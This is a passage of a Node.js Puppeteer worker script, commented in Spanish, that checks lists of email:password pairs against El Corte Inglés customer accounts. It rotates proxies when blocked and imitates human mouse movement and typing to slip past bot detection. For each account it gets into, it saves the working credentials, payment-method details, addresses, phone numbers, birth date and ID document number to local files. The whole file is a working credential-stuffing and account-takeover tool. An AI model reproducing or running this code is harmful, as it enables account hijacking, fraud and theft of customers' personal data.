                extractedData.ciudad = billingAddress.city || null;
                extractedData.pais = billingAddress.country ? billingAddress.country.name : null;
                extractedData.provincia = billingAddress.province ? billingAddress.province.name : null;

            } catch (e) {
                console.error('Error al parsear billing_address:', e.message);
            }
        }

        // Extraer direcciones adicionales
        const additionalAddressesMatch = scriptContent.match(/"shipping_addresses":\[(.*?)\]/s);
        if (additionalAddressesMatch) {
            try {
                const addresses = JSON.parse(`[${additionalAddressesMatch[1]}]`);
                extractedData.direccionesAdicionales = addresses.map(address => ({
                    nombre: address.first_name,
                    apellido: address.last_name,
                    segundoApellido: address.second_last_name || null,
                    calle: address.street_name,
                    numero: address.house_number,
                    piso: address.level || null,
                    puerta: address.door || null,
                    codigoPostal: address.postal_code,
                    ciudad: address.city,
                    telefono: address.phone_number,
                    pais: address.country ? address.country.name : null,
                    provincia: address.province ? address.province.name : null
                }));
            } catch (e) {
                console.error('Error al parsear shipping_addresses:', e.message);
            }
        }

        // Extraer fecha de nacimiento
        const dobMatch = scriptContent.match(/"date_of_birth":"(.*?)"/);
        if (dobMatch) {
            extractedData.fechaNacimiento = dobMatch[1];
        }

        // Extraer documento de identidad
        const docMatch = scriptContent.match(/"document":\s*{\s*"type":"(.*?)",\s*"number":"(.*?)"/);
        if (docMatch) {
            extractedData.tipoDocumento = docMatch[1];
            extractedData.numeroDocumento = docMatch[2];
        }

        // Extraer si tiene cupones disponibles
        const couponsMatch = scriptContent.match(/"available_promotional_coupon":(true|false)/);
        if (couponsMatch) {
            extractedData.cuponesDisponibles = couponsMatch[1] === "true";
        }


        // Retornar los datos extraídos para su uso posterior
        parentPort.postMessage(`Datos extraídos: ${JSON.stringify(extractedData)}`);
        return extractedData;

    } catch (error) {
        parentPort.postMessage('Error al extraer los datos.');
        console.error('Error:', error);
        return null;
    }
}




async function navigateToPaymentPage(page) {
    let maxRetries = 3;
    let currentRetry = 0;
    let isOnPaymentPage = false;

    while (currentRetry < maxRetries && !isOnPaymentPage) {
        // Navegar a la página de pago
        await page.waitForSelector('#js-payment-button');
        await page.click('#js-payment-button');
        await new Promise(resolve => setTimeout(resolve, randomDelay(3000, 5000)));
        await page.goto('https://www.elcorteingles.es/compra/tramitacion/pago', {
            waitUntil: ['load', 'networkidle2'],
            timeout: 60000
        });

        // Pausar para permitir que la página se cargue completamente
        await checkPaused();

        // Verificar la URL actual
        const currentUrl = page.url();

        if (currentUrl === 'https://www.elcorteingles.es/compra/tramitacion/pago') {
            parentPort.postMessage('Navegación exitosa a la página de pago.');
            isOnPaymentPage = true;
        } else if (currentUrl === 'https://www.elcorteingles.es/compra/tramitacion/cesta?expired=true') {
            parentPort.postMessage('Sesión expirada, reintentando navegación...');
            currentRetry++;

        } else {
            console.log('Se ha navegado a una URL inesperada:', currentUrl);
            currentRetry++;
        }
    }

    if (!isOnPaymentPage) {
        throw new Error('No se pudo navegar a la página de pago después de varios intentos.');
    }
}



function saveNumberData(userData) {
    if (!userData) {
        parentPort.postMessage('No hay datos válidos para guardar.');
        return;
    }

    // Guardar el número por defecto en numbers.txt
    if (userData.telefonoPorDefecto) {
        fs.appendFileSync('numbers.txt', `${userData.telefonoPorDefecto}\n`, 'utf8');
        console.log("el numero de telefono es ", userData.telefonoPorDefecto);
        parentPort.postMessage('Teléfono por defecto guardado en numbers.txt');
    }

    // Crear el bloque de datos principales para guardar en valid.txt
    const dataPrincipal =
        `Nombre: ${userData.nombre} ${userData.primerApellido} ${userData.segundoApellido || ''}\n` +
        `Dirección: ${userData.calle} ${userData.numero}, Piso: ${userData.piso || ''}, Puerta: ${userData.puerta || ''}\n` +
        `Código Postal: ${userData.codigoPostal}\n` +
        `Ciudad: ${userData.ciudad}\n` +
        `Provincia: ${userData.provincia}\n` +
        `País: ${userData.pais}\n` +
        `Teléfonos adicionales: ${userData.additionalPhones.join(', ')}\n` +
        `Fecha de Nacimiento: ${userData.fechaNacimiento}\n` +
        `Tipo de Documento: ${userData.tipoDocumento}\n` +
        `Número de Documento: ${userData.numeroDocumento}\n` +
        `Cupones Disponibles: ${userData.cuponesDisponibles ? 'Sí' : 'No'}\n` +
        `-----------------------------------------\n`;

    // Guardar los datos principales en valid.txt solo una vez
    const contenidoActual = fs.readFileSync('valid.txt', 'utf8');
    if (!contenidoActual.includes(dataPrincipal)) {
        fs.appendFileSync('valid.txt', dataPrincipal, 'utf8');
        parentPort.postMessage('Datos principales guardados en valid.txt');
    }

    // Guardar las direcciones adicionales después, en un solo bloque, evitando duplicados
    if (userData.direccionesAdicionales && userData.direccionesAdicionales.length > 0) {
        userData.direccionesAdicionales.forEach((direccion, index) => {
            const direccionData =
                `Dirección Adicional ${index + 1}:\n` +
                `  Nombre: ${direccion.nombre} ${direccion.apellido} ${direccion.segundoApellido || ''}\n` +
                `  Dirección: ${direccion.calle} ${direccion.numero}, Piso: ${direccion.piso || ''}, Puerta: ${direccion.puerta || ''}\n` +
                `  Código Postal: ${direccion.codigoPostal}\n` +
                `  Ciudad: ${direccion.ciudad}\n` +
                `  Provincia: ${direccion.provincia}\n` +
                `  País: ${direccion.pais}\n` +
                `  Teléfono: ${direccion.telefono}\n` +
                `-----------------------------------------\n`;

            // Guardar en valid.txt si no existe ya la dirección adicional
            if (!contenidoActual.includes(direccionData)) {
                fs.appendFileSync('valid.txt', direccionData, 'utf8');
                parentPort.postMessage(`Dirección Adicional ${index + 1} guardada en valid.txt`);
            }
        });
    }
}


function saveValidData(userData) {
    // Verificación de que todos los datos existen
    const nombre = userData.nombre || 'Nombre no definido';
    const apellido1 = userData.apellido1 || 'Primer apellido no definido';
    const apellido2 = userData.apellido2 || 'Segundo apellido no definido';
    const alias = userData.alias || 'Alias no definido';
    const documento = userData.documento || 'Documento no definido';

    const data =
        `Nombre: ${nombre}\nPrimer Apellido: ${apellido1}\n` +
        `Segundo Apellido: ${apellido2}\nAlias: ${alias}\n` +
        `Número de Documento: ${documento}\n` +
        `-----------------------------------------\n`;

    fs.appendFileSync('valid.txt', data, 'utf8');
    parentPort.postMessage('Datos guardados en valid.txt');
}

function savePaymentMethods(paymentMethods) {
    let data = `Métodos de Pago:\n`;

    paymentMethods.forEach((method, index) => {
        data += `Método ${index + 1}:\n` +
            `Alias: ${method.alias}\n` +
            `Descripción: ${method.description}\n` +
            `Número: ${method.maskedNumber}\n` +
            `Por Defecto: ${method.isDefault ? 'Sí' : 'No'}\n` +
            `-----------------------------------------\n`;
    });

    fs.appendFileSync('valid.txt', data, 'utf8');
    parentPort.postMessage('Métodos de pago guardados en valid.txt');
}


async function handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser }) {
    const changeProxyAndRetry = async (message) => {
        parentPort.postMessage(message);
        await browser.close();
        if (useProxies && proxies.length > 0) {
            proxyIndex = (proxyIndex + 1) % proxies.length;
        }
        if (retryOnFail) {
            i--; // Reintentar con el mismo correo
        }
    };

    if (error.message.includes('IP bloqueada') || error.message.includes('Access Denied')) {
        await changeProxyAndRetry('IP bloqueada o acceso denegado. Cambiando proxy y reintentando...');
    } else if (error.message.includes('net::ERR_NO_SUPPORTED_PROXIES')) {
        await changeProxyAndRetry('Proxy no soportado. Cambiando a otro proxy y reintentando...');
    } else if (error.message.includes('net::ERR_TUNNEL_CONNECTION_FAILED')) {
        await changeProxyAndRetry('Error de conexión de túnel. Cambiando a otro proxy y reintentando...');
    } else if (error.name === 'TimeoutError') {
        await changeProxyAndRetry('TimeoutError detectado. Asumiendo IP bloqueada y reintentando...');
    } else if (error.message.includes('URL inesperada') || error.message.includes('oauth/authorize') || error.message.includes('Redirección a URL de error detectada')) {
        await changeProxyAndRetry('Error de inicio de sesión detectado: URL inesperada de fallo de autorización. Cambiando proxy y reintentando...');
    } else if (error.message.includes('El servidor no responde.')) {
        await changeProxyAndRetry('El servidor no responde.reintentando...');
    } else {
        parentPort.postMessage(`Error inesperado: ${error.message}`);
    }

    return i;
}






async function moveMouseErratically(page, startX, startY, endX, endY) {
    // Movimiento en pequeños pasos erráticos
    const steps = 15 + Math.floor(Math.random() * 5);
    for (let i = 0; i <= steps; i++) {
        const t = i / steps;
        const curveX = startX + (endX - startX) * easeInOutQuad(t) + randomJitter();
        const curveY = startY + (endY - startY) * easeInOutQuad(t) + randomJitter();
        await page.mouse.move(curveX, curveY);
        await randomDelay(30, 70);
    }
}


async function typeWithHumanError(page, selector, text) {
    let typingSpeed = randomDelay(100, 300);
    for (let char of text) {
        if (Math.random() < 0.05) { // 5% de probabilidad de cometer un error y corregirlo
            const typo = String.fromCharCode(char.charCodeAt(0) + (Math.random() < 0.5 ? -1 : 1));
            await page.type(selector, typo, { delay: typingSpeed });
            await randomDelay(100, 300); // Pausa para "darse cuenta" del error
            await page.keyboard.press('Backspace', { delay: randomDelay(100, 200) });
        }
        await page.type(selector, char, { delay: typingSpeed });
        // Simular cambios en la velocidad de escritura
        typingSpeed = randomDelay(80, 350);
    }
}


// Funciones auxiliares
function randomJitter() {
    return Math.random() * 4 - 2; // Pequeño ajuste entre -2 y +2 píxeles
}

function easeInOutQuad(t) {
    return t < 0.5 ? 2 * t * t : -1 + (4 - 2 * t) * t;
}

function randomPosition() {
    return Math.floor(Math.random() * 800) + 100;
}

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}





async function runWorker(credentials, proxies, useProxies, retryOnFail, humanizedMode) {
    console.log(`Intentando lanzar Chrome desde: ${chromePath}`);
    console.log('Valores recibidos en el worker:', { useProxies, retryOnFail, humanizedMode });
    
    const results = [];
    let proxyIndex = 0;

    for (let i = 0; i < credentials.length; i++) {
        await checkPaused();

        const { email, password } = credentials[i];
        parentPort.postMessage(`Verificando: ${email}`);

        let proxy = useProxies && proxies.length > 0 ? proxies[proxyIndex] : null;
        let { browser, page, userDataDir } = await createBrowserInstance(proxy);

        try {
            await page.goto('https://cuenta.elcorteingles.es/servicios/citas/', {
                waitUntil: ['load', 'networkidle2'],
                timeout: 60000
            });

            await checkPaused();
            await checkAccessDenied(page);
            await rejectCookies(page);
            
            const loginSuccessful = await login(page, email, password, humanizedMode);
          

            if (loginSuccessful) {
                console.log('el login es valido');
                const paymentMethods = await handleValidLogin(page, email, password);
                if (paymentMethods) {
                    savePaymentMethods(paymentMethods);
                    await extractAndSaveAdditionalData(page);
                } else {
                    console.log('No se encontraron métodos de pago, no se procede.');
                }
            }
        

            
           

            
        } catch (error) {
            i = await handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser });
        } finally {
            await cleanUp(browser, page, userDataDir);
        }
    }

    parentPort.postMessage('Worker ha finalizado todas las tareas.');
}

async function handleValidLogin(page, email, password) {
    const { found, paymentMethods } = await extractPaymentMethods(page);

    if (found) {
        parentPort.postMessage('Se han encontrado métodos de pago.');
        fs.appendFileSync('valid.txt', `\n---------------------------\n${email}:${password}\n---------------------------\n`);
        return paymentMethods;  // Retornar los métodos de pago
    } else {
        parentPort.postMessage('No se encontraron métodos de pago.');
        return false;  // Retornar falso si no encuentra métodos de pago
    }
}

async function withTimeout(promise, ms) {
    const timeout = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Operation timed out')), ms)
    );
    return Promise.race([promise, timeout]);
}


async function extractAndSaveAdditionalData(page) {
    const userData = await extractUserData(page);
    saveValidData(userData);

    const phoneNumberData = await extractPhoneNumber(page);
    saveNumberData(phoneNumberData);
}

async function cleanUp(browser, page, userDataDir) {
    try {
        
        if (page && !page.isClosed()) {
            await withTimeout(page.close(), 5000, 'Cerrando página');
            parentPort.postMessage('Página cerrada');
        }
        parentPort.postMessage('antes del freezeo');
        if (browser && browser.isConnected()) {
            await withTimeout(browser.close(), 5000, 'Cerrando navegador');
            parentPort.postMessage('Navegador cerrado');
        }
        const browserProcess = browser ? browser.process() : null;
        if (browserProcess && !browserProcess.killed) {
            browserProcess.kill('SIGKILL');
            parentPort.postMessage('Proceso del navegador forzado a cerrar con SIGKILL.');
        }

        await new Promise(resolve => setTimeout(resolve, 2000));

        await removeDirectory(userDataDir);
    } catch (error) {
        parentPort.postMessage(`Error al cerrar la página o el navegador: ${error.message}`);
    }
}

async function removeDirectory(userDataDir) {
    if (fs.existsSync(userDataDir)) {
        for (let attempt = 0; attempt < 3; attempt++) {
            try {
                fs.rmSync(userDataDir, { recursive: true, force: true });
                console.log(`Directorio ${userDataDir} eliminado en el intento ${attempt + 1}.`);
                break;
            } catch (error) {
                console.log(`Error al eliminar el directorio ${userDataDir} en el intento ${attempt + 1}: ${error.message}`);
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    }
}

function killChromeProcesses() {
    try {
        // Ejecuta el comando para matar todos los procesos de Chrome
        execSync('taskkill /IM chrome.exe /F /T');
        console.log('Todos los procesos de Chrome han sido forzados a cerrar.');
    } catch (error) {
        console.error(`Error al forzar el cierre de Chrome: ${error.message}`);
    }
}







runWorker(workerData.credentials, workerData.proxies, workerData.useProxies, workerData.retryOnFail, workerData.humanizedMode).catch(console.error);
